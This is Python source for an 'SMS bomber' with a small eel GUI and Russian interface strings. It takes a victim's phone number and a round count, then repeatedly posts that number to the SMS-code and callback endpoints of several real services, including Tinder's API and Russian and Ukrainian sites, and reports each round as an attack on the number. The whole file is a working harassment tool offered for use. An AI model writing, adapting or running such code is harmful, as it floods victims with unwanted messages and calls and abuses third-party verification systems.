
import eel
from datetime import *

import requests, fake_useragent
from bs4 import BeautifulSoup as BS
import time
import random, string

class Bomber():

    def __init__(self):
        self.services = []
        self.state = "Unknow"
        self.proxies = { 
            "http"  : "http://10.10.1.10:3128", 
            "https" : "https://10.10.1.11:1080", 
            "ftp"   : "ftp://10.10.1.10:3128"
        }        

    def add_service(self, link, data):
        self.services.append([link, data])

    def services_init(self, phone):
        self.add_service("https://youla.ru/web-api/auth/request_code", {"phone": phone})
        self.add_service("https://3040.com.ua/taxi-ordering", {"callback-phone": phone})
        self.add_service("https://cabinet.wi-fi.ru/api/auth/by-sms", {"msisdn": phone})
        self.add_service("https://shop.vsk.ru/ajax/auth/postSms/", {"phone": phone})
        self.add_service("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", {"phone_number": phone})
        

    def do_circle(self, number):

        for num in self.services:
            self.resp = requests.post( num[0], data = num[1] )

            if self.resp.status_code > 400:
                pass
                self.state = "Не удалось отправить сообщение с сайта: " +  num[0]

        self.state = str(number) + " Круг пройден."
        time.sleep(0.5)


    def attack(self, phone, circles):
        self.phone = phone
        self.circles = int(circles) 

        for i in range(1, self.circles + 1):
            self.do_circle(i)

        #self.state = "Атака на номер " + self.phone + " завершена."

bomber = Bomber()

@eel.expose
def start_attack(phone, circles):

    if phone.replace(" ", "") == "":
        bomber.state = "Введите номер телефона."
        return 

    elif circles.replace(" ", "") == "":
        bomber.state = "Введите кол-во кругов."
        return  

    else:

        bomber.services_init(phone)
        bomber.attack(phone, circles)
        return "Атака на номер " + phone + " началась." 

@eel.expose
def get_state():
    return bomber.state


eel.init("web")
eel.start("index.html", size=(700,700))